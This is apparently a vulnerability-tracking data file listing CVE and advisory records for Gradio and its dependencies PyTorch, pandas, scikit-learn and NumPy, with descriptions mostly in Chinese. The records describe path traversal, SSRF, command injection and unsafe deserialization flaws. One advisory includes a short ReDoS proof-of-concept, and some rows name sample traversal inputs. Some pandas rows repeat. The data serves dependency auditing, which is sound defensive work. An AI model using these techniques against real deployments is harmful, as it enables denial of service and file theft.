gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,scikit-learn,,True,CVE-2024-5206,CWE-921 CWE-922,,scikit-learn 是一个基于 Python 的开源机器学习模块，支持数据挖掘和数据分析等功能。该漏洞源于 TfidfVectorizer 类在处理训练数据时，意外地将所有标记存储在 stop_words_ 属性中，而非仅存储进行 TF-IDF 计算所需的令牌子集。这种行为可能导致敏感信息泄露，例如密码或密钥，因为 stop_words_ 属性中可能包含本应被丢弃的标记。,3,1
gradio-app_gradio,scikit-learn,,True,,CWE-1333,2023-01-01,"## Overview
[scikit-learn](https://pypi.org/project/scikit-learn/) is a Python module for machine learning built on top of SciPy and is distributed under the 3-Clause BSD license.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in ARFF processing.

## PoC
```python
import re
p = re.compile(r'^\{\s*((\"".*\""|\'.*\'|\S*)\s*,\s*)*(\"".*\""|\'.*\'|\S*)\s*\}$')
re.findall(p, ""{""+""',""*100)
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `scikit-learn` to version 0.24.2 or higher.
## References
- [GitHub Commit](https://github.com/renatopp/liac-arff/commit/15885a6c016573ab2fb8aab0583dcd09990417b4)
- [GitHub Commit](https://github.com/scikit-learn/scikit-learn/commit/f058ba588a0990549f344f2d3f0d17c7925b1022)
",3,2
gradio-app_gradio,scikit-learn,,True,,CWE-400,2021-04-07,"## Overview
[scikit-learn](https://pypi.org/project/scikit-learn/) is a Python module for machine learning built on top of SciPy and is distributed under the 3-Clause BSD license.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `_RE_TYPE_NOMINAL` regular expression which is evaluated in `_decode_attribute`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `scikit-learn` to version 0.24.2 or higher.
## References
- [GitHub Additional Information](https://github.com/scikit-learn/scikit-learn/blob/8ea176ae0ca535cdbfad7413322bbc3e54979e4d/sklearn/externals/_arff.py#L772)
- [GitHub Issue](https://github.com/scikit-learn/scikit-learn/issues/19522)
- [GitHub PR](https://github.com/scikit-learn/scikit-learn/pull/19597)
",4,0
gradio-app_gradio,scikit-learn,,True,CVE-2020-13092,CWE-502,2020-05-15,"scikit-learn是一款基于Python的开源机器学习程序包，它支持垃圾邮件检测、图像识别和关联的连续值属性预测等功能。
scikit-learn (sklearn) 0.23.0及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,gradio,,True,CVE-2024-4941,CWE-22,,Gradio 是一个开源 Python 库，用于通过友好的 Web 界面演示机器学习模型。Gradio 4.25 版本中存在输入验证错误漏洞，该漏洞源于 `gradio/components/json_component.py` 的 `postprocess` 函数，由于路径验证不当，攻击者可以发送恶意的 JSON 对象，其中包含 `path` 键，进而读取远程系统上的文件，导致信息泄露。,2,1
gradio-app_gradio,gradio,,True,CVE-2023-41626,CWE-434,2023-09-15,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio v3.27.0 版本存在安全漏洞，该漏洞源于/upload接口存在任意文件上传漏洞。",3,0
gradio-app_gradio,gradio,,True,CVE-2023-34239,CWE-20,2023-06-07,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 3.33.1及之前版本存在输入验证错误漏洞，该漏洞源于缺少路径过滤，导致Gradio没有正确限制用户的文件访问。",3,2
gradio-app_gradio,gradio,,True,,CWE-22,2022-01-04,"## Overview
[gradio](https://pypi.org/project/gradio) is a Python library for easily interacting with trained machine learning models

Affected versions of this package are vulnerable to Arbitrary File Read due to missing file path validation in `gradio/networking.py`.
## Remediation
Upgrade `gradio` to version 2.6.0 or higher.
## References
- [GitHub Commit](https://github.com/gradio-app/gradio/pull/406/commits/8bdc59735f99635c76ea07f5ee4c6b622ab0d238)
- [GitHub PR](https://github.com/gradio-app/gradio/pull/406)
",3,0
gradio-app_gradio,gradio,,True,CVE-2023-6572,CWE-77,,"Gradio是一个开源的 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。此漏洞源于应用会将敏感信息暴露给未经授权的参与者。当用户能够控制`github.event.workflow_run.head_branch`的值时，可以在""生成变更集""工作流中注入shell命令。该漏洞的影响范围广泛，攻击者可以利用这一点操控系统执行任意命令。",1,1
gradio-app_gradio,gradio,,True,CVE-2024-0964,CWE-22,,"Gradio是一个开源Python库，旨在通过友好的Web界面演示机器学习模型。该漏洞源于API请求中用户提供的JSON值的缺乏正确验证，攻击者可以通过构造特定的JSON负载利用这个漏洞，读取服务器上的任意文件。当攻击者使用路径遍历序列（例如""../""）或绝对文件路径时，可能会访问存储在文件系统中的任意文件及目录，包括应用程序源代码、配置文件及其他关键系统文件。",2,1
gradio-app_gradio,gradio,,True,CVE-2023-51449,CWE-22,2023-12-22,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。在 Gradio 4.11.0 之前的版本中，存在路径遍历漏洞。该漏洞的根本原因在于 /file 端点对输入路径的处理不当，攻击者可以通过构造恶意路径来访问服务器上的任意文件。,3,1
gradio-app_gradio,gradio,,True,CVE-2021-43831,CWE-22,2021-12-15,Gradio 是一个开源 Python 库，用于通过用户友好的 Web 界面演示和交互机器学习模型。Gradio 2.5.0 之前的版本存在一个安全漏洞，该漏洞源于对文件访问权限控制不当。攻击者可以利用此漏洞访问主机上的任何文件，从而读取本不应访问的数据和信息。,1,1
gradio-app_gradio,gradio,,True,,CWE-918,2024-01-01,"## Overview
[gradio](https://pypi.org/project/gradio) is a Python library for easily interacting with trained machine learning models

Affected versions of this package are vulnerable to Server-side Request Forgery (SSRF) using the `/file` route since it used to perform a `GET/HEAD` request to determine if a `filepath` was a possible URL.
## Remediation
Upgrade `gradio` to version 4.10.0 or higher.
## References
- [GitHub PR](https://github.com/gradio-app/gradio/pull/6794)
",3,0
gradio-app_gradio,gradio,,True,CVE-2024-1729,CWE-367,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。该漏洞源于字符串比较方式处理不当，在遇到字符串不匹配时可提前终止，攻击者可以利用这一行为进行暴力破解，猜测密码受保护的应用程序。攻击者可以发起大量请求而不受请求限制，从而容易猜测出正确的用户凭证。,3,1
gradio-app_gradio,gradio,,True,CVE-2022-24770,CWE-1236,2022-03-17,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 2.8.11之前版本 存在安全漏洞，该漏洞源于gradio中 CSV 文件的公式元素中和不当。该漏洞允许攻击者将任意文本保存到 CSV 文件中。如果像 MS Excel 程序打开这样的文件，它会自动运行这些命令，这会导致在用户的计算机上运行任意命令。",2,0
gradio-app_gradio,gradio,,True,CVE-2023-25823,CWE-798,2023-02-23,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 3.13.1之前版本存在安全漏洞，该漏洞源于包含硬编码凭证的使用。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-1727,CWE-352,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。该漏洞源于 CORS 规则的实现不当，导致攻击者可以通过构造特定请求，绕过要求 `host` 头部为 localhost（或其别名）、`origin` 头部的限制，从而实施跨站请求伪造攻击。攻击者可以利用此漏洞，向运行 Gradio 的本地服务器发送请求，上传多个大型文件，导致目标系统的可用磁盘空间耗尽，进而可能影响服务的可用性。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-2206,CWE-918,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。此漏洞存在于 Gradio 的 /proxy 路由中，攻击者可以通过操纵请求中的 X-Direct-Url 头，允许代理任意 URL，包括潜在的内部端点。由于应用程序在处理自定义网址时缺乏适当的验证，这使得攻击者能够将 URL 添加到代理请求中，从而损害系统的安全性。通过此方法，攻击者可以获取内部网络信息。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1540,CWE-77,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。存在命令注入漏洞，该漏洞源于不当处理 CI 过程中的命令行参数。攻击者可以通过特定的输入在执行 shell 脚本时注入恶意命令，造成信息泄露和未授权的基库修改。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1728,CWE-22,,Gradio是一个开源的Python库，通过友好的Web界面演示机器学习模型。该漏洞源于对用户输入的验证不当，攻击者可以通过操控上传至'/queue/join'端点的文件路径来读取文件系统中的任意文件，如私钥等。该漏洞可能导致远程代码执行，使得攻击者能够将文件上传重定向到服务器上未预期的位置。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1561,CWE-29,,Gradio 是一个开源的 Python 库，用于以友好的 Web 界面展示机器学习模型。该库存在一个不当访问控制的漏洞，具体表现为 `/component_server` 端点错误地允许以攻击者控制的参数调用 `Component` 类上的任何方法。攻击者可以利用 `Block` 类的 `move_resource_to_block_cache()` 方法，通过该漏洞实现对本地文件的未授权读取，从而可能导致敏感信息泄露。尤其是在通过 `launch(share=True)` 暴露应用程序到互联网后，任何人都可以读取用户计算机上的文件。此外，所有托管在 huggingface.co 上的 Gradio 应用程序也受到此漏洞的影响。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1183,CWE-601,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面与训练好的机器学习模型进行交互。存在服务器端请求伪造 (SSRF) 漏洞，源于对 'file' 参数的处理不当。攻击者可以通过构造特定的 GET 请求，利用此漏洞扫描和识别内部网络中的开放端口，通过 'Location' 头或 'File not allowed' 错误的响应来判断内部端口的状态。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-34511,CWE-284,2024-05-05,Gradio 是一个开源的 Python 库，用于创建用户友好的接口，广泛应用于机器学习和数据科学应用。此漏洞存在于 Gradio 组件处理 `_is_server_fn` 属性验证的过程中。由于对函数 `_is_server_fn` 属性的验证不当，攻击者可能会利用该漏洞执行原本受限的函数，进而实现未授权的操作或访问敏感数据。,3,0
gradio-app_gradio,gradio,,True,CVE-2024-34510,CWE-116,2024-05-05,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 4.20之前版本存在安全漏洞，该漏洞源于允许 Windows 上的凭据泄露。",2,2
gradio-app_gradio,gradio,,True,CVE-2024-4940,CWE-601,,Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。此库存在输入验证错误漏洞，该漏洞源于开放重定向的安全问题。攻击者可以通过构造恶意的 URL，将用户重定向到任意网站，从而进行网络钓鱼攻击、跨站脚本攻击 (XSS) 等。利用此漏洞，攻击者能够根据响应中的 'Location' 头或 '文件不允许' 错误判断内部网络中开放端口的状态，从而逐步扫描内部网络。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-4325,CWE-918,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面简化机器学习模型的演示。该漏洞存在于 Gradio 4.21.0 版本的 `/queue/join` 端点和 `save_url_to_cache` 函数中。由于对用户输入的 `path` 参数未进行充分的验证，攻方可以通过发送特制请求实现对内部网络或 AWS 元数据端点的未授权访问。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-47867,CWE-345,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在数据伪造问题漏洞，该漏洞源于如果攻击者获得下载 FRP 客户端的远程 URL 的访问权限，他们可以在不被发现的情况下修改二进制文件，因为 Gradio 服务器不会验证文件的校验和或签名。",4,2
gradio-app_gradio,gradio,,True,CVE-2024-47167,CWE-918,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于Gradio 的 `async_save_url_to_cache` 函数允许攻击者强制 Gradio 服务器向用户控制的 URL 发送 HTTP 请求。",3,1
gradio-app_gradio,gradio,,True,CVE-2024-47870,CWE-362,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在竞争条件问题漏洞，该漏洞源于攻击者利用该漏洞可以将用户流量重定向到恶意服务器。",2,0
gradio-app_gradio,gradio,,True,CVE-2024-47084,CWE-285,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在授权问题漏洞，该漏洞源于攻击者利用该漏洞可以向本地 Gradio 服务器发出未经授权的请求。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-47872,CWE-79,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在跨站脚本漏洞，该漏洞源于经过身份验证的用户可以上传包含恶意脚本的文件，例如 HTML、JavaScript 或 SVG 文件。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-47869,CWE-203,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于比较不是在恒定时间内完成的，攻击者可以通过测量不同请求的响应时间来逐字节推断正确的哈希值，从而利用这一点。",4,0
gradio-app_gradio,gradio,,True,CVE-2024-47168,CWE-670,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于即使在监控被禁用的情况下，攻击者或未经授权的用户仍然可以通过直接请求 /monitoring 端点来访问监控仪表板。",4,0
gradio-app_gradio,gradio,,True,CVE-2024-47164,CWE-22,2024-10-10,<p>Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。 Gradio存在路径遍历漏洞，该漏洞源于is_in_or_equal函数旨在检查文件是否位于给定目录中，可以使用某些使用`..`序列操纵文件路径来绕过该函数。</p>,4,2
gradio-app_gradio,gradio,,True,CVE-2024-47868,CWE-200 CWE-22,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在信息泄露漏洞，该漏洞源于攻击者利用该漏洞可以通过制作绕过预期输入限制的请求来利用这些组件。",3,2
gradio-app_gradio,gradio,,True,CVE-2024-47871,CWE-311,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于HTTPS 未在连接上强制执行。攻击者利用该漏洞可以拦截和读取上传到 Gradio 服务器的文件，以及修改客户端和服务器之间发送的响应或数据。",2,2
gradio-app_gradio,gradio,,True,CVE-2024-47165,CWE-285,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在授权问题漏洞，该漏洞源于当 Gradio 服务器在本地部署时，`localhost_aliases` 变量包含“null”作为有效来源。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-47166,CWE-22,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在路径遍历漏洞，该漏洞源于攻击者利用该漏洞可以通过操纵请求中的文件路径来访问和泄露自定义 Gradio 组件的源代码。",4,2
gradio-app_gradio,gradio,,True,CVE-2024-48052,CWE-918,2024-11-04,Gradio 是一个用于通过友好的Web界面展示和分享机器学习模型的开源Python库，能够简化数据科学家和开发者演示他们模型的过程。在版本4.42.0的Gradio中，其gr.DownloadButton函数中存在服务器端请求伪造（SSRF）漏洞。攻击者可能利用该漏洞通过该功能发送精心构造的请求，从而导致服务器执行未授权的外部请求。,2,0
gradio-app_gradio,gradio,,True,CVE-2025-23042,CWE-285,2025-01-14,"Gradio是Gradio开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 5.6.0之前版本存在授权问题漏洞，该漏洞源于对文件的路径验证逻辑缺乏规范化。攻击者利用该漏洞可以通过更改被阻止的文件或目录路径的字母大小写，绕过Gradio的文件路径访问控制列表（ACL）。",2,2
gradio-app_gradio,gradio,,True,CVE-2024-8966,CWE-770,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面展示训练好的机器学习模型。在其文件上传过程中，存在一个拒绝服务（DoS）漏洞。攻击者可以在 multipart 边界的结尾添加大量字符，导致系统不断处理每个字符并发出警告。这可能导致 Gradio 在长时间内无法访问，从而中断服务，造成显著的停机时间。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-8021,CWE-601,,Gradio是一个开源的Python库，旨在通过友好的Web界面来演示机器学习模型。该库的最新版本存在开放重定向漏洞，允许攻击者通过URL编码的方式将用户重定向到恶意网站。此漏洞的根本原因在于Gradio在处理重定向请求时未能对外部URL进行足够的验证。攻击者可以通过发送特制请求，导致服务器返回302重定向到攻击者控制的网站。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-12217,CWE-22,,Gradio 是一个开源的 Python 库，旨在以友好的 Web 界面演示机器学习模型。该库在版本 git 67e4044 中存在一个路径遍历漏洞，其根本原因在于 blocked_path 功能的实现缺陷。具体来说，尽管该应用程序能正确阻止对类似 'C:/tmp/secret.txt' 的路径访问，但在使用 NTFS 备用数据流（ADS）语法时，例如 'C:/tmp/secret.txt::$DATA'，却未能阻止访问。这一缺陷可能导致未授权用户读取被阻止的文件路径。,3,1
gradio-app_gradio,gradio,,True,CVE-2025-48889,CWE-434,2025-05-30,Gradio的标记功能存在任意文件复制漏洞，攻击者可以绕过身份验证，复制服务器文件系统中的任何可读文件。攻击者不能读取复制的文件，但可以通过复制大型文件（如/dev/urandom）填满磁盘空间，导致服务拒绝。,3,2
